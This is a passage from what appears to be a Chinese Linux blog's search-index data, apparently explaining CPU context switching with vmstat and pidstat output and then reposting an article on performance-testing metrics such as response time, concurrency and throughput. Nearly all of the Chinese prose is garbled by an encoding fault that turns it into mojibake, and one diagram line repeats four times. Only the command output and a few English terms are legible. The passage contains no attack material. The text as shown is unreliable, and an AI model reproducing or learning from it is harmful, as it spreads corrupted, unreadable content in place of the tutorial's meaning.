ˆä»¥åŠè™šæ‹Ÿå†…å­˜ç­‰æ•°æ®çš„ä¿å­˜å’Œæ¢å¤ä¸Šï¼Œç¼©çŸ­è¿›ç¨‹çœŸæ­£è¿è¡Œçš„æ—¶é—´ï¼Œæˆäº†ç³»ç»Ÿæ€§èƒ½å¤§å¹…ä¸‹é™çš„ä¸€ä¸ªå…ƒå‡¶ã€‚ æ—¢ç„¶ä¸Šä¸‹æ–‡åˆ‡æ¢å¯¹ç³»ç»Ÿæ€§èƒ½å½±å“é‚£ä¹ˆå¤§ï¼Œåˆ°åº•è¦æ€ä¹ˆæŸ»çœ‹ä¸Šä¸‹æ–‡åˆ‡æ¢å‘¢ï¼Ÿå¯ä»¥ä½¿ç”¨vmstatè¿™ä¸ªå·¥å…·ï¼Œæ¥æŸ¥è¯¢ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢æƒ…å†µã€‚ vmstatæ˜¯å¸¸ç”¨çš„ç³»ç»Ÿæ€§èƒ½åˆ†æå·¥å…·ï¼Œä¸»è¦ç”¨æ¥åˆ†æç³»ç»Ÿçš„å†…å­˜ä½¿ç”¨æƒ…å†µï¼Œä¹Ÿå¸¸ç”¨æ¥åˆ†æ CPU ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œä¸­æ–­çš„æ¬¡æ•°ã€‚ [root@0x5c0f ~][0]$ vmstat 2 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 4 0 0 10895260 13356 7206976 0 0 34 24 186 109 4 2 94 0 0 2 0 0 10944452 13356 7179112 0 0 0 14 3414 3917 4 2 94 0 0 0 0 0 10940036 13356 7179008 0 0 0 1404 2930 3534 4 2 95 0 0 0 0 0 10953532 13356 7168816 0 0 0 114 2823 3232 3 2 95 0 0 procsï¼ˆè¿›ç¨‹ï¼‰ rï¼šå½“å‰è¿è¡Œé˜Ÿåˆ—ä¸­çº¿ç¨‹çš„æ•°ç›®ï¼Œä»£è¡¨çº¿ç¨‹å¤„äºå¯è¿è¡ŒçŠ¶æ€ï¼Œä½†CPUè¿˜æœªèƒ½æ‰§è¡Œï¼Œè¿™ä¸ªå€¼å¯ä»¥ä½œä¸ºåˆ¤æ–­CPUæ˜¯å¦ç¹å¿™çš„ä¸€ä¸ªæŒ‡æ ‡ï¼›å½“è¿™ä¸ªå€¼è¶…è¿‡äº†CPUæ•°ç›®ï¼Œå°±ä¼šå‡ºç°CPUç“¶é¢ˆäº†ï¼›è¿™ä¸ªæˆ‘ä»¬å¯ä»¥ç»“åˆtopå‘½ä»¤çš„è´Ÿè½½å€¼åŒæ­¥è¯„ä¼°ç³»ç»Ÿæ€§èƒ½ï¼ˆç­‰å¾…è¿è¡Œçš„è¿›ç¨‹æ•°ï¼ˆ(Running or Runnable)æ˜¯å°±ç»ªé˜Ÿåˆ—çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯æ­£åœ¨è¿è¡Œå’Œç­‰å¾…CPUçš„è¿›ç¨‹æ•°ï¼‰ï¼‰ bï¼šå¤„åœ¨éä¸­æ–­ç¡çœ çŠ¶æ€çš„è¿›ç¨‹æ•° systemï¼ˆç³»ç»Ÿï¼‰è¿™2ä¸ªå€¼è¶Šå¤§ï¼Œä¼šçœ‹åˆ°ç”±å†…æ ¸æ¶ˆè€—çš„CPUæ—¶é—´ä¼šè¶Šå¤§ inï¼š(interrupt)åˆ™æ˜¯æ¯ç§’ä¸­æ–­çš„æ¬¡æ•°ï¼ŒåŒ…æ‹¬æ—¶é’Ÿä¸­æ–­ csï¼š (context switch)æ˜¯æ¯ç§’ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¬¡æ•° cpuï¼ˆä»¥ç™¾åˆ†æ¯”è¡¨ç¤ºï¼‰ usï¼šç”¨æˆ·è¿›ç¨‹æ‰§è¡Œæ—¶é—´(user time)ï¼› syï¼šç³»ç»Ÿè¿›ç¨‹æ‰§è¡Œæ—¶é—´(system time)ï¼› idï¼šç©ºé—²æ—¶é—´(åŒ…æ‹¬IOç­‰å¾…æ—¶é—´)ï¼› waï¼šç­‰å¾…IOæ—¶é—´ï¼›waçš„å€¼é«˜æ—¶ï¼Œè¯´æ˜IOç­‰å¾…æ¯”è¾ƒä¸¥é‡ï¼Œè¿™å¯èƒ½ç”±äºç£ç›˜å¤§é‡ä½œéšæœºè®¿é—®é€ æˆï¼Œä¹Ÿæœ‰å¯èƒ½ç£ç›˜å‡ºç°ç“¶é¢ˆã€‚ rï¼š è¡¨ç¤ºè¿è¡Œé˜Ÿåˆ—(å°±æ˜¯è¯´å¤šå°‘ä¸ªè¿›ç¨‹çœŸçš„åˆ†é…åˆ°CPU)ï¼Œæˆ‘æµ‹è¯•çš„æœåŠ¡å™¨ç›®å‰CPUæ¯”è¾ƒç©ºé—²ï¼Œæ²¡ä»€ä¹ˆç¨‹åºåœ¨è·‘ï¼Œå½“è¿™ä¸ªå€¼è¶…è¿‡äº†CPUæ•°ç›®ï¼Œå°±ä¼šå‡ºç°CPUç“¶é¢ˆäº†ã€‚è¿™ä¸ªä¹Ÿå’Œtopçš„è´Ÿè½½æœ‰å…³ç³»ï¼Œä¸€èˆ¬è´Ÿè½½è¶…è¿‡äº†3å°±æ¯”è¾ƒé«˜ï¼Œè¶…è¿‡äº†5å°±é«˜ï¼Œè¶…è¿‡äº†10å°±ä¸æ­£å¸¸äº†ï¼ŒæœåŠ¡å™¨çš„çŠ¶æ€å¾ˆå±é™©ã€‚topçš„è´Ÿè½½ç±»ä¼¼æ¯ç§’çš„è¿è¡Œé˜Ÿåˆ—ã€‚å¦‚æœè¿è¡Œé˜Ÿåˆ—è¿‡å¤§ï¼Œè¡¨ç¤ºä½ çš„CPUå¾ˆç¹å¿™ï¼Œä¸€èˆ¬ä¼šé€ æˆCPUä½¿ç”¨ç‡å¾ˆé«˜ã€‚ csï¼šæ¯ç§’ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°ï¼Œä¾‹å¦‚æˆ‘ä»¬è°ƒç”¨ç³»ç»Ÿå‡½æ•°ï¼Œå°±è¦è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œçº¿ç¨‹çš„åˆ‡æ¢ï¼Œä¹Ÿè¦è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œè¿™ä¸ªå€¼è¦è¶Šå°è¶Šå¥½ï¼Œå¤ªå¤§äº†ï¼Œè¦è€ƒè™‘è°ƒä½çº¿ç¨‹æˆ–è€…è¿›ç¨‹çš„æ•°ç›®,ä¾‹å¦‚åœ¨apacheå’Œnginxè¿™ç§webæœåŠ¡å™¨ä¸­, æˆ‘ä»¬ä¸€èˆ¬åšæ€§èƒ½æµ‹è¯•æ—¶ä¼šè¿›è¡Œå‡ åƒå¹¶å‘ç”šè‡³å‡ ä¸‡å¹¶å‘çš„æµ‹è¯•ï¼Œé€‰æ‹©webæœåŠ¡å™¨çš„è¿›ç¨‹å¯ä»¥ç”±è¿›ç¨‹æˆ–è€…çº¿ç¨‹çš„å³°å€¼ä¸€ç›´ä¸‹è°ƒï¼Œå‹æµ‹ï¼Œç›´åˆ°csåˆ°ä¸€ä¸ªæ¯”è¾ƒå°çš„å€¼ï¼Œè¿™ä¸ªè¿›ç¨‹å’Œçº¿ç¨‹æ•°å°±æ˜¯æ¯”è¾ƒåˆé€‚çš„å€¼äº†. ç³»ç»Ÿè°ƒç”¨ä¹Ÿæ˜¯ï¼Œæ¯æ¬¡è°ƒç”¨ç³»ç»Ÿå‡½æ•°ï¼Œæˆ‘ä»¬çš„ä»£ç å°±ä¼šè¿›å…¥å†…æ ¸ç©ºé—´ï¼Œå¯¼è‡´ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œè¿™ä¸ªæ˜¯å¾ˆè€—èµ„æºï¼Œä¹Ÿè¦å°½é‡é¿å…é¢‘ç¹è°ƒç”¨ç³»ç»Ÿå‡½æ•°ã€‚ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°è¿‡å¤šè¡¨ç¤ºä½ çš„CPUå¤§éƒ¨åˆ†æµªè´¹åœ¨ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå¯¼è‡´CPUå¹²æ­£ç»äº‹çš„æ—¶é—´å°‘äº†ï¼ŒCPUæ²¡æœ‰å……åˆ†åˆ©ç”¨ï¼Œæ˜¯ä¸å¯å–çš„ã€‚ vmstatåªç»™å‡ºäº†ç³»ç»Ÿæ€»ä½“çš„ä¸Šä¸‹æ–‡åˆ‡æ¢æƒ…å†µï¼Œè¦æƒ³æŸ¥çœ‹æ¯ä¸ªè¿›ç¨‹çš„è¯¦ç»†æƒ…å†µï¼Œå°±éœ€è¦ä½¿ç”¨pidstat äº†ã€‚ç»™å®ƒåŠ ä¸Š-wé€‰é¡¹ï¼Œä½ å°±å¯ä»¥æŸ¥çœ‹æ¯ä¸ªè¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æƒ…å†µäº†ã€‚ [root@0x5c0f ~][130]$ pidstat -w 5 Linux 5.14.18-100.fc33.x86_64 (0x5c0f) 2022å¹´09æœˆ01æ—¥ _x86_64_ (8 CPU) 15æ—¶54åˆ†47ç§’ UID PID cswch/s nvcswch/s Command 15æ—¶54åˆ†52ç§’ 0 2 0.20 0.00 kthreadd 15æ—¶54åˆ†52ç§’ 0 13 0.60 0.00 ksoftirqd/0 15æ—¶54åˆ†52ç§’ 0 14 91.42 0.00 rcu_sched 15æ—¶54åˆ†52ç§’ 0 15 0.20 0.00 migration/0 15æ—¶54åˆ†52ç§’ 0 18 0.20 0.00 migration/1 15æ—¶54åˆ†52ç§’ 0 19 0.60 0.00 ksoftirqd/1 è¿™ä¸ªç»“æœä¸­æœ‰ä¸¤åˆ—å†…å®¹æ˜¯æˆ‘ä»¬çš„é‡ç‚¹å…³æ³¨å¯¹è±¡ã€‚ ä¸€ä¸ªæ˜¯cswch,è¡¨ç¤ºæ¯ç§’è‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ (voluntary context switches)çš„æ¬¡æ•°ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯nvcswch ,è¡¨ç¤ºæ¯ç§’éè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ (non voluntary context switches)çš„æ¬¡æ•° æ‰€è°“è‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œæ˜¯æŒ‡è¿›ç¨‹æ— æ³•è·å–æ‰€éœ€èµ„æºï¼Œå¯¼è‡´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚æ¯”å¦‚è¯´ï¼ŒI/Oã€å†…å­˜ç­‰ç³»ç»Ÿèµ„æºä¸è¶³æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚ è€Œéè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œåˆ™æ˜¯æŒ‡è¿›ç¨‹ç”±äºæ—¶é—´ç‰‡å·³åˆ°ç­‰åŸå› ï¼Œè¢«ç³»ç»Ÿå¼ºåˆ¶è°ƒåº¦ï¼Œè¿›è€Œå‘ç”Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚æ¯”å¦‚è¯´ï¼Œå¤§é‡è¿›ç¨‹éƒ½åœ¨äº‰æŠ¢CPUæ—¶ï¼Œå°±å®¹æ˜“å‘ç”Ÿéè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚ è¿™ä¸¤åˆ—å¦‚æœæ•°å€¼æ¯”è¾ƒå¤§æ„å‘³ç€ä¸åŒçš„æ€§èƒ½é—®é¢˜: è‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶è¯´æ˜è¿›ç¨‹åœ¨ç­‰å¾…èµ„æºï¼Œæœ‰å¯èƒ½å‘ç”Ÿäº†I/Oç­‰é—®é¢˜ éè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œè¯´æ˜è¿›ç¨‹åœ¨è¢«å¼ºåˆ¶è°ƒåº¦ï¼Œä¹Ÿå°±æ˜¯åœ¨äº‰æŠ¢CPU ä¸­æ–­æ¬¡æ•°å¤šäº†ï¼Œè¯´æ˜CPUåœ¨è¢«ä¸­æ–­å¤„ç†ç¨‹åºå ç”¨ã€‚å¯ä»¥é€šè¿‡/proc/interrupts æŸ¥çœ‹ ","date":"2022-09-01","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"Linuxæ€§èƒ½æŒ‡æ ‡ä¹‹cpuä¸Šä¸‹æ–‡åˆ‡æ¢","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"Linuxæ€§èƒ½æµ‹è¯•ä¹‹æ€§èƒ½æµ‹è¯•æŒ‡æ ‡","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"Linuxæ€§èƒ½æµ‹è¯•ä¹‹æ€§èƒ½æµ‹è¯•æŒ‡æ ‡(è½¬è½½)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" Linux æ€§èƒ½æµ‹è¯•ä¹‹æ€§èƒ½æµ‹è¯•æŒ‡æ ‡è¯¦è§£(åŸæ–‡) https://blog.csdn.net/u010521062/article/details/115908166 å‰è¨€ æ€§èƒ½æµ‹è¯•æŒ‡æ ‡æ˜¯è¡¡é‡ç³»ç»Ÿæ€§èƒ½çš„è¯„ä»·æ ‡å‡†ï¼Œå¸¸ç”¨çš„ç³»ç»Ÿæ€§èƒ½æµ‹è¯•æŒ‡æ ‡åŒ…æ‹¬ï¼šå“åº”æ—¶é—´ã€å¹¶å‘ç”¨æˆ·/å¹¶å‘ã€ç‚¹å‡»ç‡ã€ååé‡ã€TPS/QPSã€PV/UVï¼›LinuxæœåŠ¡å™¨å¸¸ç”¨çš„æ€§èƒ½æŒ‡æ ‡åŒ…æ‹¬ï¼šCPUä½¿ç”¨ç‡ã€å†…å­˜å ç”¨ç‡ã€ç£ç›˜IOã€ç³»ç»Ÿå¹³å‡è´Ÿè½½ç­‰ã€‚ 1. ç³»ç»Ÿæ€§èƒ½æµ‹è¯•æŒ‡æ ‡ 1.1. å“åº”æ—¶é—´ å“åº”æ—¶é—´æ˜¯æŒ‡æŸä¸ªè¯·æ±‚æˆ–æ“ä½œä»å‘å‡ºåˆ°æ¥æ”¶åˆ°åé¦ˆæ‰€æ¶ˆè€—çš„æ—¶é—´ï¼ŒåŒ…æ‹¬åº”ç”¨æœåŠ¡å™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰å¤„ç†æ—¶é—´ã€ç½‘ç»œä¼ è¾“æ—¶é—´ä»¥åŠæ•°æ®åº“æœåŠ¡å™¨å¤„ç†æ—¶é—´ã€‚æ¯”å¦‚ä¸€ä¸ªé¡µé¢ä»ç‚¹å‡»/è¾“å…¥åˆ°å®Œå…¨åŠ è½½çš„æ—¶é—´ï¼›å®Œæˆä¸€æ¬¡å¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹æˆ–è€…æŸ¥è¯¢åŠ¨ä½œçš„äº‹åŠ¡å“åº”æ—¶é—´ç­‰ã€‚ ä¸€ä¸ªè¯·æ±‚åœ¨ç½‘ç»œä¸Šçš„ä¼ è¾“å¾€å¾€è¦ç»å†å¤šä¸ªç½‘ç»œèŠ‚ç‚¹æ‰èƒ½åˆ°è¾¾ç›®æ ‡æœåŠ¡å™¨ï¼Œæˆ‘ä»¬å‡è®¾è¯·æ±‚ç»å†äº†ä¸‰ä¸ªç½‘ç»œèŠ‚ç‚¹çš„ä¼ è¾“æ—¶é—´B1ã€B2ã€B3ï¼Œå®¢æˆ·ç«¯çš„å¤„ç†æ—¶é—´ä¸ºAï¼ŒæœåŠ¡å™¨çš„å“åº”æ—¶é—´ä¸ºCã€‚åˆ™ä¸€æ¬¡è¯·æ±‚çš„å®Œæ•´è·¯å¾„å¯ä»¥æè¿°ä¸ºä¸‹å›¾ï¼š graph RL; æœåŠ¡å™¨C --\u003e|åé¦ˆ|èŠ‚ç‚¹B3--\u003eèŠ‚ç‚¹B2--\u003eèŠ‚ç‚¹B1--\u003e|åé¦ˆ|å®¢æˆ·ç«¯A å®¢æˆ·ç«¯A --\u003e|è¯·æ±‚| èŠ‚ç‚¹B1--\u003eèŠ‚ç‚¹B2--\u003eèŠ‚ç‚¹B3--\u003e|è¯·æ±‚|æœåŠ¡å™¨C graph RL; æœåŠ¡å™¨C --\u003e|åé¦ˆ|èŠ‚ç‚¹B3--\u003eèŠ‚ç‚¹B2--\u003eèŠ‚ç‚¹B1--\u003e|åé¦ˆ|å®¢æˆ·ç«¯A å®¢æˆ·ç«¯A --\u003e|è¯·æ±‚| èŠ‚ç‚¹B1--\u003eèŠ‚ç‚¹B2--\u003eèŠ‚ç‚¹B3--\u003e|è¯·æ±‚|æœåŠ¡å™¨C graph RL; æœåŠ¡å™¨C --\u003e|åé¦ˆ|èŠ‚ç‚¹B3--\u003eèŠ‚ç‚¹B2--\u003eèŠ‚ç‚¹B1--\u003e|åé¦ˆ|å®¢æˆ·ç«¯A å®¢æˆ·ç«¯A --\u003e|è¯·æ±‚| èŠ‚ç‚¹B1--\u003eèŠ‚ç‚¹B2--\u003eèŠ‚ç‚¹B3--\u003e|è¯·æ±‚|æœåŠ¡å™¨C graph RL; æœåŠ¡å™¨C --\u003e|åé¦ˆ|èŠ‚ç‚¹B3--\u003eèŠ‚ç‚¹B2--\u003eèŠ‚ç‚¹B1--\u003e|åé¦ˆ|å®¢æˆ·ç«¯A å®¢æˆ·ç«¯A --\u003e|è¯·æ±‚| èŠ‚ç‚¹B1--\u003eèŠ‚ç‚¹B2--\u003eèŠ‚ç‚¹B3--\u003e|è¯·æ±‚|æœåŠ¡å™¨C å®¢æˆ·ç«¯ä»å‘å‡ºè¯·æ±‚åˆ°æ¥æ”¶åˆ°æœåŠ¡å™¨åé¦ˆçš„å®Œæ•´é“¾è·¯æ—¶é—´ä¸ºAâ€”\u003eB1â€”\u003eB2â€”\u003eB3â€”\u003eCï¼ˆèŠ‚ç‚¹å¤„ç†æ—¶é—´éƒ½åŒ…æ‹¬æ¥æ”¶å’Œå‘é€ä¸¤ä¸ªè¿‡ç¨‹ï¼‰ã€‚ åˆ™è¯·æ±‚çš„å“åº”æ—¶é—´ä¸ºï¼š å“åº”æ—¶é—´=A+B1+B2+B3+C 1.2. å¹¶å‘ å¹¶å‘æ˜¯æŒ‡å¤šä¸ªç”¨æˆ·åœ¨åŒä¸€æ—¶æœŸå†…è¿›è¡Œç›¸åŒçš„äº‹åŠ¡å¤„ç†æˆ–æ“ä½œã€‚ç”±äºç”¨æˆ·åœ¨è¿›è¡Œä¸€ç³»åˆ—æ“ä½œæµç¨‹æ—¶æœ‰ä¸€å®šçš„æ—¶é—´é—´éš”ï¼ˆå³ç”¨æˆ·æ€è€ƒæ—¶é—´ï¼‰æˆ–è€…æœåŠ¡å™¨å¤„ç†è¯·æ±‚æœ‰å…ˆåé¡ºåºï¼Œäºæ˜¯ï¼Œå°±äº§ç”Ÿäº†ç»å¯¹å¹¶å‘å’Œç›¸å¯¹å¹¶å‘æ¦‚å¿µçš„åŒºåˆ†ã€‚ ç»å¯¹å¹¶å‘æ˜¯æŒ‡åŒä¸€æ—¶åˆ»ï¼ˆå³åŒä¸€æ—¶é—´ç‚¹ï¼‰å¹¶å‘ç”¨æˆ·å¯¹æœåŠ¡å™¨åŒæ—¶å‘é€è¯·æ±‚ã€‚ ç›¸å¯¹å¹¶å‘æ˜¯æŒ‡ä¸€æ®µæ—¶é—´å†…ï¼ˆå³åŒä¸€æ—¶é—´åŒºé—´ï¼‰å¹¶å‘ç”¨æˆ·å¯¹æœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œä¸€ä¸ªå¹¶å‘é‡ä¸º10000äººï¼ˆå¯åŒæ—¶å®¹çº³10000äººï¼‰çš„åŠ¨ç‰©å›­ï¼Œè¿™é‡Œçš„å¹¶å‘é‡æ˜¯æŒ‡ç»å¯¹å¹¶å‘è¿˜æ˜¯ç›¸å¯¹å¹¶å‘å‘¢ï¼Ÿæˆ‘ä»¬å¾ˆå®¹æ˜“ç†è§£ï¼Œè¿™ä¸ªå¹¶å‘æŒ‡çš„æ˜¯ç›¸å¯¹å¹¶å‘ï¼Œå› ä¸ºæ•´ä¸ªåŠ¨ç‰©å›­æ˜¯ä¸€ä¸ªäº¤ç»‡çš„ç½‘çŠ¶ç»“æ„ï¼Œå‡ºå…¥å£ã€è€è™ã€ç‹®å­ã€å¤§è±¡ç­‰å„ä¸ªåŠ¨ç‰©ç«™ç‚¹éƒ½æœ‰åˆ†æµçš„ä½œç”¨ï¼ŒåŸºæœ¬ä¸å¯èƒ½å‡ºç°å‡ºå…¥å£æˆ–è€…ç«™ç‚¹èƒ½å¤ŸåŒæ—¶æ‰¿è½½10000äººçš„æƒ…å†µï¼Œå‡ºå…¥å£çš„å¹¶å‘å¯èƒ½åªæœ‰200äººã€‚ å› æ­¤è¿™ä¸ªåŠ¨ç‰©å›­çš„ä¾‹å­é‡Œï¼Œå¹¶å‘é‡10000æ˜¯æŒ‡å„ä¸ªèŠ‚ç‚¹çš„æ€»å’Œï¼Œå‚è§‚è€…å‚è§‚åŠ¨ç‰©å›­æœ‰è·¯å¾„çš„å…ˆåé¡ºåºï¼Œæ˜¯ç›¸å¯¹å¹¶å‘çš„æ¦‚å¿µã€‚è€Œå‡ºå…¥å£çš„å¹¶å‘é‡æ˜¯200äººï¼Œåˆ™æ˜¯æŒ‡åŒä¸€æ—¶é—´åœ¨å‡ºå…¥å£èƒ½å¤ŸåŒæ—¶å®¹çº³200äººï¼Œè¿™å°±æ˜¯ç»å¯¹å¹¶å‘çš„æ¦‚å¿µã€‚ TODO: è¿™é‡Œç¼ºå°‘ä¸€å¼ å›¾ ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨ç³»ç»Ÿçš„æ€§èƒ½æµ‹è¯•ä¸­ï¼Œç³»ç»Ÿæˆ–è€…æ¨¡å—çš„å¹¶å‘æ›´å¤šæ˜¯æŒ‡ç›¸å¯¹å¹¶å‘ï¼Œè€Œæ¥å£çš„å¹¶å‘æ›´å€¾å‘äºç»å¯¹å¹¶å‘ã€‚å¹¶å‘æ€§èƒ½çš„æ¦‚å¿µæ˜¯æŒ‡ç³»ç»Ÿã€æ¨¡å—æˆ–æ¥å£ç¨³å®šè¿è¡Œï¼Œä¸æŠ›å‡ºå¼‚å¸¸æƒ…å†µä¸‹æ‰€èƒ½å¤Ÿæ‰¿è½½çš„å¹¶å‘é‡ã€‚ åœ¨å¹¶å‘æ€§èƒ½æµ‹è¯•ä¸­å¸¸ç”¨åˆ°å¹¶å‘ç”¨æˆ·æ•°å’Œå¹¶å‘è¯·æ±‚æ•°ä¸¤ä¸ªæŒ‡æ ‡ã€‚é¡¾åæ€ä¹‰ï¼Œå¹¶å‘ç”¨æˆ·æ•°æ˜¯æŒ‡åŒä¸€æ—¶é—´ï¼ˆç‚¹æˆ–åŒºé—´ï¼‰ï¼Œç³»ç»Ÿã€æ¨¡å—æˆ–æ¥å£èƒ½å¤Ÿæ‰¿è½½çš„ç”¨æˆ·æ•°é‡ï¼›å¹¶å‘è¯·æ±‚æ•°æ˜¯æŒ‡åŒä¸€æ—¶é—´ï¼ˆç‚¹æˆ–åŒºé—´ï¼‰ï¼Œç³»ç»Ÿã€æ¨¡å—æˆ–æ¥å£èƒ½å¤Ÿæ‰¿è½½çš„è¯·æ±‚æ•°é‡ã€‚ 1.3. ç‚¹å‡»é‡/ç‚¹å‡»ç‡ ç‚¹å‡»é‡æ˜¯è¡¡é‡ç½‘ç«™æµé‡çš„ä¸€ä¸ªæŒ‡æ ‡ï¼Œä¹Ÿå°±æ˜¯ç‚¹å‡»æ•°clicksï¼Œæ˜¯å¯¹ç½‘ç«™ç‚¹å‡»æ•°æ®çš„ç»Ÿè®¡ã€‚ ç‚¹å‡»ç‡ï¼ˆClicks Ratioï¼‰ä¹Ÿå¯ä»¥å«åšç‚¹è¿›ç‡ï¼ˆClick-through Rateï¼‰ï¼Œå®ƒæ˜¯ç½‘ç«™ä¸ŠæŸä¸€å†…å®¹è¢«ç‚¹å‡»çš„æ¬¡æ•°ä¸æ•´ä¸ªç½‘ç«™å†…å®¹è¢«æ˜¾ç¤ºæ¬¡æ•°ä¹‹æ¯”ï¼Œå³clicks/viewsã€‚ååº”äº†ç½‘ç«™ä¸ŠæŸä¸€é¡µé¢æˆ–å†…å®¹çš„å—å…³æ³¨ç¨‹åº¦ï¼Œç»å¸¸ç”¨æ¥è¡¡é‡å¹¿å‘Šçš„å¸å¼•ç¨‹åº¦ã€‚æ¯”å¦‚å…¬ä¼—å·çš„ä¸€ç¯‡æ–‡ç« è¢«æµè§ˆäº†10wæ¬¡ï¼Œæ–‡ç« ä¸­çš„å¹¿å‘Šé“¾æ¥è¢«ç‚¹å‡»äº†2000æ¬¡ï¼Œé‚£ä¹ˆè¿™æ¡å¹¿å‘Šçš„ç‚¹å‡»ç‡æ˜¯2%ï¼ˆ2000/100000*100%ï¼‰ã€‚ åœ¨æ€§èƒ½æµ‹è¯•é¢†åŸŸï¼Œç‚¹å‡»ç‡ï¼ˆhit rateï¼‰å¸¸æŒ‡å•ä½æ—¶é—´å†…ï¼ˆæ¯ç§’é’Ÿï¼‰é¡µé¢çš„ç‚¹å‡»æ•°ï¼Œå³æ¯ç§’é’Ÿå‘é€çš„httpè¯·æ±‚æ•°é‡ï¼Œç‚¹å‡»ç‡è¶Šå¤§å¯¹æœåŠ¡å™¨é€ æˆçš„å‹åŠ›ä¹Ÿè¶Šå¤§ï¼Œå¯¹æœåŠ¡å™¨çš„æ€§èƒ½è¦æ±‚ä¹Ÿè¶Šé«˜ã€‚ æœ‰äº›äººå®¹æ˜“æ··æ·†ç‚¹å‡»ç‡å’Œç‚¹å‡»é‡çš„æ¦‚å¿µï¼Œæ¯”å¦‚æˆ‘ä»¬ç»å¸¸ä¼šå¬åˆ°æœ‰äººè¯´æŸç½‘ç«™çš„ç‚¹å‡»ç‡æ˜¯å¤šå¤šä¸‡ï¼Œå®é™…ä¸Šè¿™é‡Œçš„ç‚¹å‡»ç‡æŒ‡çš„æ˜¯ç‚¹å‡»é‡ï¼Œæ›å…‰ç‡æˆ–è€…è¯´é¡µé¢æµè§ˆé‡ã€‚ 1.4. ååé‡/ååç‡ ååé‡æ˜¯æŒ‡ç³»ç»Ÿå¤„ç†å®¢æˆ·è¯·æ±‚æ•°é‡çš„æ€»å’Œï¼Œå¯ä»¥æŒ‡ç½‘ç»œä¸Šä¼ è¾“æ•°æ®åŒ…çš„æ€»å’Œï¼Œä¹Ÿå¯ä»¥æŒ‡ä¸šåŠ¡ä¸­å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨äº¤äº’æ•°æ®é‡çš„æ€»å’Œã€‚ ååç‡æ˜¯æŒ‡å•ä½æ—¶é—´å†…ç³»ç»Ÿå¤„ç†å®¢æˆ·è¯·æ±‚çš„æ•°é‡ï¼Œä¹Ÿå°±æ˜¯å•ä½æ—¶é—´å†…çš„ååé‡ã€‚å¯ä»¥ä»å¤šä¸ªç»´åº¦è¡¡é‡ååç‡ï¼šâ‘ ä¸šåŠ¡è§’åº¦ï¼šå•ä½æ—¶é—´ï¼ˆæ¯ç§’ï¼‰çš„è¯·æ±‚æ•°æˆ–é¡µé¢æ•°ï¼Œå³è¯·æ±‚æ•°/ç§’æˆ–é¡µé¢æ•°/ç§’ï¼›â‘¡ç½‘ç»œè§’åº¦ï¼šå•ä½æ—¶é—´ï¼ˆæ¯ç§’ï¼‰ç½‘ç»œä¸­ä¼ è¾“çš„æ•°æ®åŒ…å¤§å°ï¼Œå³å­—èŠ‚æ•°/ç§’ç­‰ï¼›â‘¢ç³»ç»Ÿè§’åº¦ï¼Œå•ä½æ—¶é—´å†…æœåŠ¡å™¨æ‰€æ‰¿å—çš„å‹åŠ›ï¼Œå³ç³»ç»Ÿçš„è´Ÿè½½èƒ½åŠ›ã€‚ ååç‡ï¼ˆæˆ–ååé‡ï¼‰æ˜¯ä¸€ç§å¤šç»´åº¦é‡çš„æ€§èƒ½æŒ‡æ ‡ï¼Œå®ƒä¸è¯·æ±‚å¤„ç†æ‰€æ¶ˆè€—çš„CPUã€å†…å­˜ã€IOå’Œç½‘ç»œå¸¦å®½éƒ½å¼ºç›¸å…³ã€‚ 1.5. TPS/QPS TPSï¼ˆTransaction Per 